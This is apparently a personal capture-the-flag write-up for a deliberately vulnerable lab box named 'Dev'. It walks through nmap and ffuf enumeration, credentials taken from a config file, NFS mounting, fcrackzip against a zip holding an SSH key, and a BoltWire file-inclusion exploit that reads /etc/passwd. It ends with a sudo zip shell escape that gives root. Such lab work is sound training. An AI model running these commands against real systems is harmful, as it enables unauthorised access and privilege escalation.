# Target Details

| IP            | Hostname/Box | Operating System |
| ------------- | ------------ | ---------------- |
| 192.168.1.107 | Dev      | Linux |

# Box Outline
This box was a stand-alone virtual machine that hosted a misconfigured Bolt webtheme(port 80) (a) and was built on a Apache server (port 8080). I explored the bolt application by creating a new user in order to discover its functionality. No real information that can lead to exploitation. Used dirbuster for directory discovery, and came across the following folders: public > index, source and app. I continued to explore and came across the config.yml file. This file contained useful information such as database information, username and password. Using information from the directory discovery, (folder path /dev), and the new credentials, we were able to login to the Bolt webtheme. I continued by exploring network file shares, and came across a network file share at: /srv/nfs. This share folder revealed 2 files that contained some additional useful information. I searched for possible vulnerabilities for bolt and discovered a "local file inclusion exploit". Using this exploit, I was able to list out all user accounts via the web browser. One user stood out "jeanpaul". I used this and previously discovered credentials to ssh into their account. Once I was logged in, I explored what commands can be run as root as the current user. The command `zip` can be run as sudo user in this account. Using open source research, I found an exploit that allows a user to escalate privileges based on the owner of the command being exploited. Once this was discovered, I was able to log in as root, and retrieve the flag.

# Scanning and Enumeration
Started off with an nmap scan for open ports, services and other useful information about the target. Had to increase verbosity and use a -sX flag for it to pick up the target.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sX -A -T4 192.168.1.*
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 17:36 EDT
Nmap scan report for 192.168.1.107
Host is up (0.0011s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd96ec082fb1ea06cafc468a7e8ae355 (RSA)
|   256 56323b9f482de07e1bdf20f80360565e (ECDSA)
|_  256 95dd20ee6f01b6e1432e3cf438035b36 (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      44469/tcp6  mountd
|   100005  1,2,3      48132/udp6  mountd
|   100005  1,2,3      54211/tcp   mountd
|   100005  1,2,3      57881/udp   mountd
|   100021  1,3,4      45863/tcp   nlockmgr
|   100021  1,3,4      45863/tcp6  nlockmgr
|   100021  1,3,4      49154/udp6  nlockmgr
|   100021  1,3,4      50192/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:5C:1E:21 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   1.13 ms 192.168.1.107

Nmap scan report for 192.168.1.100
Host is up (0.000034s latency).
All 1000 scanned ports on 192.168.1.100 are in ignored states.
Not shown: 1000 closed tcp ports (reset)
Too many fingerprints match this host to give specific OS details
Network Distance: 0 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 256 IP addresses (3 hosts up) scanned in 2530.61 seconds
```

|IP|Hostname|Operating System|
|---|---|---|
|192.168.1.107|Dev|Linux 4.15 - 5.6|

## Findings
### Port 80
Bolt Installation Error page
![](Screenshot%202023-06-26%20at%2022.02.43.png)


### Port 8080
PHP Version information
![](Screenshot%202023-06-26%20at%2022.05.19.png)

apache2handler
![](Screenshot%202023-06-26%20at%2022.07.48.png)

Apache Environment
![](Screenshot%202023-06-26%20at%2022.08.22.png)

mysqli (mysqlnd 5.0.12-dev - 20150407 - $Id: 7cc7cc96e675f6d72e5cf0f267f48e167c2abb23 $ )
![](Screenshot%202023-06-26%20at%2022.09.50.png)![](Screenshot%202023-06-27%20at%2011.36.29.png)![](Screenshot%202023-06-27%20at%2011.36.56.png)

Created the first user
username: new_user
password: new_user
email: new_user@mail.com
display name: new_user

![](Screenshot%202023-06-27%20at%2011.47.01.png)![](Screenshot%202023-06-27%20at%2011.50.08.png)
## File and Folder discovery
### dirbuster
Results from dirbuster
![](Screenshot%202023-06-27%20at%2012.39.45.png)
Exploring public/index.php
![](Screenshot%202023-06-27%20at%2022.19.56.png)
### ffuf
Alternate directory discovery: ffuf results shows key directories
```bash
#http://192.168.1.108:8080/FUZZ
 :: URL              : http://192.168.1.108:8080/FUZZ

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 11ms]
    * FUZZ: dev
```

```bash
#http://192.168.1.108/FUZZ
 :: URL              : http://192.168.1.108/FUZZ

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: public

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 0ms]
    * FUZZ: src

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 1ms]
    * FUZZ: app

[Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 1ms]
    * FUZZ: vendor

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 1ms]
    * FUZZ: extensions

```

Port 80/app, exploring the config.yml file
![](Screenshot%202023-07-03%20at%2017.58.43.png)
key finding:
username: bolt
password: I_love_java

Port 8080/dev
![](Screenshot%202023-07-03%20at%2016.53.58.png)

Guided to exploring the nfs (network file share) using the `showmount` command
```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 192.168.1.107
Export list for 192.168.1.107:
/srv/nfs 172.16.0.0/12,10.0.0.0/8,192.168.0.0/16
```
list out mounted directory from file share that's offered up

The following depicts mounting the share drive to a local drive. Listing the folder's contents. 
![](Screenshot%202023-07-03%20at%2015.24.34.png)
![](Screenshot%202023-07-03%20at%2017.36.17.png)
# Exploitation
Used a tool called fcrackzip to unzip #compressed #zipfiles
```bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

#tip
*If you have an id_rsa file, you might be able to ssh into a system via the following*
```bash
ssh -i id_rsa username@ipaddress
Example
ssh -i id_rsa jp@192.168.1.107
```
*Possibly will ask for password*
```bash
┌──(root㉿kali)-[/mnt/dev]
└─# unzip save.zip
Archive:  save.zip
[save.zip] id_rsa password: 
  inflating: id_rsa                  
  inflating: todo.txt                
                                                                                                                       
┌──(root㉿kali)-[/mnt/dev]
└─# ls
id_rsa  save.zip  todo.txt

```
todo.txt
![](Screenshot%202023-07-03%20at%2018.00.35.png)
*understand XSS - used to attack users, not the actual box*
![](Screenshot%202023-07-03%20at%2018.01.51.png)
Exploit local file inclusion for Boltwire
https://www.exploit-db.com/exploits/48411
This script exploits a misconfiguration by allowing an attacker to navigate to the /etc/passwd folder, and list its contents
![](Screenshot%202023-07-03%20at%2017.11.10.png)
key finding:
`jeanpaul:x:1000:1000:jeanpaul,,,:/home/jeanpaul:/bin/bash`
I was able to ssh into jeanpaul's account with the previously found password

![](Screenshot%202023-07-03%20at%2018.17.17.png)
# Privilege Escalation
#tip ALWAYS check `history` and `sudo` permissions when logged in as a user on the target box

Running the command `sudo -l` shows us what commands are available to the logged in user, and can be run as root. In this box, the command `zip` can be run as sudo user. Using google we found the following resource GTFOBins (https://gtfobins.github.io/gtfobins/zip/) that provided a script that allows the following:
*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```
Once we dropped into the shell as root, we were able to find the flag.txt
![](Screenshot%202023-07-03%20at%2022.30.39.png)